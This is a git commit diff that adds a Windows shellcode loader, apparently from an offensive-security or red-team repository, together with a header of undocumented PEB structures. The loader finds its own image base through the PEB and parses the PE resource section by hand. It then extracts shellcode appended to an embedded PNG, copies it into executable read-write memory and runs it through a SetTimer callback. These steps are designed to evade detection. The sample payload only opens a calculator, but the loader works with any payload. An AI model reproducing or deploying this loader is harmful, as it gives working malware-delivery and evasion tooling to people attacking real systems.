58f5d72fa94e398f5243564e01403395e7c495c3
André Oliveira <andreoliveira208@gmail.com>
2025-02-17 12:28:26 +0000

    Update to the hGetCurrentModuleHandle function
    resolving compiler-optimization crashes and supporting x86/x64

---
+++ code/payload-extractor/payload-extractor-from-rsrc-via-peb/PEB_Structs.h
@@ -0,0 +1,339 @@
+#pragma once
+
+
+#ifndef STRUCTS_H
+#define STRUCTS_H
+
+#include <Windows.h>
+
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _STRING
+{
+    USHORT Length;
+    USHORT MaximumLength;
+    PCHAR  Buffer;
+} STRING, * PSTRING, ANSI_STRING, * PANSI_STRING, OEM_STRING, * POEM_STRING;
+
+
+typedef struct _PEB_LDR_DATA
+{
+    ULONG Length;
+    BOOLEAN Initialized;
+    HANDLE SsHandle;
+    LIST_ENTRY InLoadOrderModuleList;
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+    PVOID EntryInProgress;
+    BOOLEAN ShutdownInProgress;
+    HANDLE ShutdownThreadId;
+} PEB_LDR_DATA, * PPEB_LDR_DATA;
+
+
+
+typedef struct _CURDIR
+{
+    UNICODE_STRING DosPath;
+    HANDLE Handle;
+} CURDIR, * PCURDIR;
+
+#define RTL_USER_PROC_CURDIR_CLOSE 0x00000002
+#define RTL_USER_PROC_CURDIR_INHERIT 0x00000003
+
+typedef struct _RTL_DRIVE_LETTER_CURDIR
+{
+    USHORT Flags;
+    USHORT Length;
+    ULONG TimeStamp;
+    STRING DosPath;
+} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;
+
+#define RTL_MAX_DRIVE_LETTERS 32
+#define RTL_DRIVE_LETTER_VALID (USHORT)0x0001
+
+typedef struct _RTL_USER_PROCESS_PARAMETERS
+{
+    ULONG MaximumLength;
+    ULONG Length;
+
+    ULONG Flags;
+    ULONG DebugFlags;
+
+    HANDLE ConsoleHandle;
+    ULONG ConsoleFlags;
+    HANDLE StandardInput;
+    HANDLE StandardOutput;
+    HANDLE StandardError;
+
+    CURDIR CurrentDirectory;
+    UNICODE_STRING DllPath;
+    UNICODE_STRING ImagePathName;
+    UNICODE_STRING CommandLine;
+    PVOID Environment;
+
+    ULONG StartingX;
+    ULONG StartingY;
+    ULONG CountX;
+    ULONG CountY;
+    ULONG CountCharsX;
+    ULONG CountCharsY;
+    ULONG FillAttribute;
+
+    ULONG WindowFlags;
+    ULONG ShowWindowFlags;
+    UNICODE_STRING WindowTitle;
+    UNICODE_STRING DesktopInfo;
+    UNICODE_STRING ShellInfo;
+    UNICODE_STRING RuntimeData;
+    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];
+
+    ULONG_PTR EnvironmentSize;
+    ULONG_PTR EnvironmentVersion;
+
+    PVOID PackageDependencyData;
+    ULONG ProcessGroupId;
+    ULONG LoaderThreads;
+
+    UNICODE_STRING RedirectionDllName; // REDSTONE4
+    UNICODE_STRING HeapPartitionName; // 19H1
+    ULONG_PTR DefaultThreadpoolCpuSetMasks;
+    ULONG DefaultThreadpoolCpuSetMaskCount;
+    ULONG DefaultThreadpoolThreadMaximum;
+    ULONG HeapMemoryTypeMask; // WIN11
+} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
+
+
+typedef struct _API_SET_NAMESPACE
+{
+    ULONG Version;
+    ULONG Size;
+    ULONG Flags;
+    ULONG Count;
+    ULONG EntryOffset;
+    ULONG HashOffset;
+    ULONG HashFactor;
+} API_SET_NAMESPACE, * PAPI_SET_NAMESPACE;
+
+
+#define GDI_HANDLE_BUFFER_SIZE32 34
+#define GDI_HANDLE_BUFFER_SIZE64 60
+
+#ifndef _WIN64
+#define GDI_HANDLE_BUFFER_SIZE GDI_HANDLE_BUFFER_SIZE32
+#else
+#define GDI_HANDLE_BUFFER_SIZE GDI_HANDLE_BUFFER_SIZE64
+#endif
+
+typedef ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];
+
+typedef ULONG GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];
+typedef ULONG GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];
+
+typedef struct _ACTIVATION_CONTEXT_DATA
+{
+    ULONG Magic;
+    ULONG HeaderSize;
+    ULONG FormatVersion;
+    ULONG TotalSize;
+    ULONG DefaultTocOffset; // to ACTIVATION_CONTEXT_DATA_TOC_HEADER
+    ULONG ExtendedTocOffset; // to ACTIVATION_CONTEXT_DATA_EXTENDED_TOC_HEADER
+    ULONG AssemblyRosterOffset; // to ACTIVATION_CONTEXT_DATA_ASSEMBLY_ROSTER_HEADER
+    ULONG Flags; // ACTIVATION_CONTEXT_FLAG_*
+} ACTIVATION_CONTEXT_DATA, * PACTIVATION_CONTEXT_DATA;
+
+
+typedef struct _ASSEMBLY_STORAGE_MAP_ENTRY
+{
+    ULONG Flags;
+    UNICODE_STRING DosPath;
+    HANDLE Handle;
+} ASSEMBLY_STORAGE_MAP_ENTRY, * PASSEMBLY_STORAGE_MAP_ENTRY;
+
+typedef struct _ASSEMBLY_STORAGE_MAP
+{
+    ULONG Flags;
+    ULONG AssemblyCount;
+    PASSEMBLY_STORAGE_MAP_ENTRY* AssemblyArray;
+} ASSEMBLY_STORAGE_MAP, * PASSEMBLY_STORAGE_MAP;
+
+typedef struct _PEB
+{
+    BOOLEAN InheritedAddressSpace;
+    BOOLEAN ReadImageFileExecOptions;
+    BOOLEAN BeingDebugged;
+    union
+    {
+        BOOLEAN BitField;
+        struct
+        {
+            BOOLEAN ImageUsesLargePages : 1;
+            BOOLEAN IsProtectedProcess : 1;
+            BOOLEAN IsImageDynamicallyRelocated : 1;
+            BOOLEAN SkipPatchingUser32Forwarders : 1;
+            BOOLEAN IsPackagedProcess : 1;
+            BOOLEAN IsAppContainer : 1;
+            BOOLEAN IsProtectedProcessLight : 1;
+            BOOLEAN IsLongPathAwareProcess : 1;
+        };
+    };
+
+    HANDLE Mutant;
+
+    PVOID ImageBaseAddress;
+    PPEB_LDR_DATA Ldr;
+    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
+    PVOID SubSystemData;
+    PVOID ProcessHeap;
+    PRTL_CRITICAL_SECTION FastPebLock;
+    PSLIST_HEADER AtlThunkSListPtr;
+    PVOID IFEOKey;
+
+    union
+    {
+        ULONG CrossProcessFlags;
+        struct
+        {
+            ULONG ProcessInJob : 1;
+            ULONG ProcessInitializing : 1;
+            ULONG ProcessUsingVEH : 1;
+            ULONG ProcessUsingVCH : 1;
+            ULONG ProcessUsingFTH : 1;
+            ULONG ProcessPreviouslyThrottled : 1;
+            ULONG ProcessCurrentlyThrottled : 1;
+            ULONG ProcessImagesHotPatched : 1; // REDSTONE5
+            ULONG ReservedBits0 : 24;
+        };
+    };
+    union
+    {
+        PVOID KernelCallbackTable;
+        PVOID UserSharedInfoPtr;
+    };
+    ULONG SystemReserved;
+    ULONG AtlThunkSListPtr32;
+    PAPI_SET_NAMESPACE ApiSetMap;
+    ULONG TlsExpansionCounter;
+    PVOID TlsBitmap;
+    ULONG TlsBitmapBits[2];
+
+    PVOID ReadOnlySharedMemoryBase;
+    PVOID SharedData; // HotpatchInformation
+    PVOID* ReadOnlyStaticServerData;
+
+    PVOID AnsiCodePageData; // PCPTABLEINFO
+    PVOID OemCodePageData; // PCPTABLEINFO
+    PVOID UnicodeCaseTableData; // PNLSTABLEINFO
+
+    ULONG NumberOfProcessors;
+    ULONG NtGlobalFlag;
+
+    ULARGE_INTEGER CriticalSectionTimeout;
+    SIZE_T HeapSegmentReserve;
+    SIZE_T HeapSegmentCommit;
+    SIZE_T HeapDeCommitTotalFreeThreshold;
+    SIZE_T HeapDeCommitFreeBlockThreshold;
+
+    ULONG NumberOfHeaps;
+    ULONG MaximumNumberOfHeaps;
+    PVOID* ProcessHeaps; // PHEAP
+
+    PVOID GdiSharedHandleTable; // PGDI_SHARED_MEMORY
+    PVOID ProcessStarterHelper;
+    ULONG GdiDCAttributeList;
+
+    PRTL_CRITICAL_SECTION LoaderLock;
+
+    ULONG OSMajorVersion;
+    ULONG OSMinorVersion;
+    USHORT OSBuildNumber;
+    USHORT OSCSDVersion;
+    ULONG OSPlatformId;
+    ULONG ImageSubsystem;
+    ULONG ImageSubsystemMajorVersion;
+    ULONG ImageSubsystemMinorVersion;
+    KAFFINITY ActiveProcessAffinityMask;
+    GDI_HANDLE_BUFFER GdiHandleBuffer;
+    PVOID PostProcessInitRoutine;
+
+    PVOID TlsExpansionBitmap;
+    ULONG TlsExpansionBitmapBits[32];
+
+    ULONG SessionId;
+
+    ULARGE_INTEGER AppCompatFlags;
+    ULARGE_INTEGER AppCompatFlagsUser;
+    PVOID pShimData;
+    PVOID AppCompatInfo; // APPCOMPAT_EXE_DATA
+
+    UNICODE_STRING CSDVersion;
+
+    PACTIVATION_CONTEXT_DATA ActivationContextData;
+    PASSEMBLY_STORAGE_MAP ProcessAssemblyStorageMap;
+    PACTIVATION_CONTEXT_DATA SystemDefaultActivationContextData;
+    PASSEMBLY_STORAGE_MAP SystemAssemblyStorageMap;
+
+    SIZE_T MinimumStackCommit;
+
+    PVOID SparePointers[2]; // 19H1 (previously FlsCallback to FlsHighIndex)
+    PVOID PatchLoaderData;
+    PVOID ChpeV2ProcessInfo; // _CHPEV2_PROCESS_INFO
+
+    ULONG AppModelFeatureState;
+    ULONG SpareUlongs[2];
+
+    USHORT ActiveCodePage;
+    USHORT OemCodePage;
+    USHORT UseCaseMapping;
+    USHORT UnusedNlsField;
+
+    PVOID WerRegistrationData;
+    PVOID WerShipAssertPtr;
+
+    union
+    {
+        PVOID pContextData; // WIN7
+        PVOID pUnused; // WIN10
+        PVOID EcCodeBitMap; // WIN11
+    };
+
+    PVOID pImageHeaderHash;
+    union
+    {
+        ULONG TracingFlags;
+        struct
+        {
+            ULONG HeapTracingEnabled : 1;
+            ULONG CritSecTracingEnabled : 1;
+            ULONG LibLoaderTracingEnabled : 1;
+            ULONG SpareTracingBits : 29;
+        };
+    };
+    ULONGLONG CsrServerReadOnlySharedMemoryBase;
+    PRTL_CRITICAL_SECTION TppWorkerpListLock;
+    LIST_ENTRY TppWorkerpList;
+    PVOID WaitOnAddressHashTable[128];
+    PVOID TelemetryCoverageHeader; // REDSTONE3
+    ULONG CloudFileFlags;
+    ULONG CloudFileDiagFlags; // REDSTONE4
+    CHAR PlaceholderCompatibilityMode;
+    CHAR PlaceholderCompatibilityModeReserved[7];
+    struct _LEAP_SECOND_DATA* LeapSecondData; // REDSTONE5
+    union
+    {
+        ULONG LeapSecondFlags;
+        struct
+        {
+            ULONG SixtySecondEnabled : 1;
+            ULONG Reserved : 31;
+        };
+    };
+    ULONG NtGlobalFlag2;
+    ULONGLONG ExtendedFeatureDisableMask; // since WIN11
+} PEB, * PPEB;
+
+#endif // !STRUCTS_H
---
+++ code/payload-extractor/payload-extractor-from-rsrc-via-peb/payload-extractor-from-rsrc-via-peb.cpp
@@ -0,0 +1,203 @@
+// Payload-extractor-from-resource.cpp
+// By WafflesExploits
+
+#define _CRT_SECURE_NO_WARNINGS // Avoid warning messages for fopen
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include "resource.h"
+#include "PEB_Structs.h"
+
+// Modify the following variables below:
+#define ORIGINAL_FILE_SIZE 6594 // Replace with the actual original file size
+#define PAYLOAD_RESOURCE_ID IDB_PNG1 // Find this value in resource.h
+#define PAYLOAD_RESOURCE_TYPE L"PNG" // Find this value in Resource.rc. Search by your resource_id.
+
+
+
+/**
+ * @brief Retrieves the handle of the current module via PEB using architecture-appropriate instructions (x86/x64), avoiding memory walking for reliability.
+ * @return HMODULE Always returns the base address of the current module via the PEB's ImageBaseAddress field.
+ */
+HMODULE hGetCurrentModuleHandle() {
+    // Retrieve the PEB pointer using the appropriate method for x86/x64
+#ifdef _WIN64
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+#else
+    PPEB pPeb = (PPEB)__readfsdword(0x30);
+#endif
+
+    // Return the image base address stored in the PEB
+    return (HMODULE)pPeb->ImageBaseAddress;
+}
+
+
+// This function was based on the code from https://github.com/NUL0x4C/AtomLdr
+/**
+ * @brief Fetches raw data and size for a specified resource from the current module.
+ *
+ * @param hModule Handle to the module containing the resource.
+ * @param ResourceId ID of the resource to fetch.
+ * @param ppResourceRawData Pointer to a pointer where the raw resource data will be stored.
+ * @param psResourceDataSize Pointer to a DWORD where the resource data size will be stored.
+ * @return BOOL TRUE if the resource data is successfully fetched, FALSE otherwise.
+ */
+BOOL GetResourceData(HMODULE hModule, WORD ResourceId, PVOID* ppResourceRawData, PDWORD psResourceDataSize) {
+    CHAR* pBaseAddr = (CHAR*)hModule;
+
+    // Parse the DOS header to locate the PE headers
+    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBaseAddr;
+    PIMAGE_NT_HEADERS pImgNTHdr = (PIMAGE_NT_HEADERS)(pBaseAddr + pImgDosHdr->e_lfanew);
+    PIMAGE_OPTIONAL_HEADER pImgOptionalHdr = (PIMAGE_OPTIONAL_HEADER)&pImgNTHdr->OptionalHeader;
+
+    // Locate the resource directory from the PE optional header
+    PIMAGE_DATA_DIRECTORY pDataDir = &pImgOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];
+    PIMAGE_RESOURCE_DIRECTORY pResourceDir = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress);
+    PIMAGE_RESOURCE_DIRECTORY_ENTRY pResourceEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir + 1);
+
+    // Iterate through the resource directory entries
+    for (size_t i = 0; i < (pResourceDir->NumberOfNamedEntries + pResourceDir->NumberOfIdEntries); i++) {
+        if (pResourceEntry[i].DataIsDirectory == 0)
+            break;
+
+        // Locate the second-level resource directory
+        PIMAGE_RESOURCE_DIRECTORY pResourceDir2 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry[i].OffsetToDirectory & 0x7FFFFFFF));
+        PIMAGE_RESOURCE_DIRECTORY_ENTRY pResourceEntry2 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir2 + 1);
+
+        // Check if the second-level entry matches the requested resource ID
+        if (pResourceEntry2->DataIsDirectory == 1 && pResourceEntry2->Id == ResourceId) {
+            // Locate the third-level resource directory
+            PIMAGE_RESOURCE_DIRECTORY pResourceDir3 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry2->OffsetToDirectory & 0x7FFFFFFF));
+            PIMAGE_RESOURCE_DIRECTORY_ENTRY pResourceEntry3 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir3 + 1);
+
+            // Retrieve the resource data entry
+            PIMAGE_RESOURCE_DATA_ENTRY pResource = (PIMAGE_RESOURCE_DATA_ENTRY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry3->OffsetToData & 0x7FFFFFFF));
+
+            // Store the raw resource data and its size
+            *ppResourceRawData = (PVOID)(pBaseAddr + pResource->OffsetToData);
+            *psResourceDataSize = pResource->Size;
+
+            return TRUE;
+        }
+    }
+
+    return FALSE;
+}
+
+/**
+ * @brief Extracts the hidden payload from the resource section using PEB parsing without relying
+ * on WinAPI functions, treating the resource data as a combined file (original + payload).
+ *
+ * @param resourceID The resource identifier (e.g., IDB_PNG1).
+ * @param resourceType The resource type (e.g., PNG).
+ * @param pPayload Pointer to an unsigned char* where the extracted payload will be stored.
+ * @param pPayload_size Pointer to a size_t where the payload size will be stored.
+ * @param original_size The size of the original file in bytes.
+ * @return BOOL TRUE if extraction is successful, FALSE otherwise.
+ */
+BOOL extract_payload_from_resource_via_peb(WORD resourceID, LPCWSTR resourceType, unsigned char** pPayload, size_t* pPayload_size, long int original_size) {
+    PVOID pResourceRawData = NULL;
+    DWORD dwResourceDataSize = 0;
+
+
+    // Fetch current module handle via PEB
+    HMODULE hModule = hGetCurrentModuleHandle();
+    if (hModule == NULL) {
+        printf("[!] Unable to get the current module handle.\n");
+        return FALSE;
+    }
+
+    printf("[#] Fetching Image from .rsrc section via PEB...\n");
+    // Fetch the resource data using the manual method
+    if (!GetResourceData(hModule, resourceID, &pResourceRawData, &dwResourceDataSize)) {
+        printf("[!] Failed to fetch resource data.\n");
+        return FALSE;
+    }
+
+    // Calculate the payload size
+    long int payload_size = (long int)dwResourceDataSize - original_size;
+    if (payload_size <= 0) {
+        printf("[!] No payload data found after the original file.\n");
+        return FALSE;
+    }
+
+    printf("[i] Payload size to extract from resources: %ld bytes\n", payload_size);
+
+    // Allocate memory for the payload
+    unsigned char* Payload = (unsigned char*)malloc(payload_size);
+    if (Payload == NULL) {
+        printf("[!] Unable to allocate memory for payload.\n");
+        return FALSE;
+    }
+
+    // Copy the payload data starting from original_size offset
+    memcpy(Payload, (unsigned char*)pResourceRawData + original_size, payload_size);
+
+    *pPayload = Payload;
+    *pPayload_size = (size_t)payload_size;
+    return TRUE;
+}
+
+
+/**
+ * @brief Executes payload via SetTimer Callback function.
+ *
+ * @param Payload Pointer to where payload is stored.
+ * @param sPayloadSize Size of Payload.
+ * @return BOOL TRUE if successful, FALSE otherwise.
+ */
+BOOL ExecutePayloadViaCallback(unsigned char* Payload, size_t sPayloadSize) {
+    // Allocate memory for payload with VirtualAlloc
+    LPVOID pShellcodeAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (pShellcodeAddress == NULL) {
+        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
+
+    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);
+    printf("[#] Writing Payload ... \n");
+
+    // Copy the payload into the allocated memory
+    memcpy(pShellcodeAddress, Payload, sPayloadSize);
+
+    // Free the original payload buffer since it's no longer needed
+    free(Payload);
+
+    printf("[#] Executing payload ... \n");
+
+    // Execute the payload by setting it as the callback for a timer
+    UINT_PTR dummy = 0;
+    MSG msg;
+
+    SetTimer(NULL, dummy, NULL, (TIMERPROC)pShellcodeAddress);
+    GetMessageW(&msg, NULL, 0, 0);
+    DispatchMessageW(&msg);
+
+    // Free the allocated memory after executing the payload
+    VirtualFree(pShellcodeAddress, sPayloadSize, MEM_RELEASE);
+
+    return TRUE;
+}
+
+int main() {
+    unsigned char* Payload = NULL;
+    size_t sPayloadSize = 0;
+    long int OriginalFileSize = ORIGINAL_FILE_SIZE;
+
+    // Extract the payload from the resource section, treating the resource data
+    // as a combined file: original file + appended payload.
+    if (!extract_payload_from_resource_via_peb(PAYLOAD_RESOURCE_ID, PAYLOAD_RESOURCE_TYPE, &Payload, &sPayloadSize, OriginalFileSize)) {
+        printf("[!] Payload extraction from resource failed.\n");
+        return EXIT_FAILURE;
+    }
+
+    // The combined_file.png's shellcode opens a calculator
+
+    // Execute the payload via callback
+    if (!ExecutePayloadViaCallback(Payload, sPayloadSize)) {
+        printf("[!] ExecutePayloadViaCallback failed.\n");
+        return EXIT_FAILURE;
+    }
+
+    return EXIT_SUCCESS;
+}
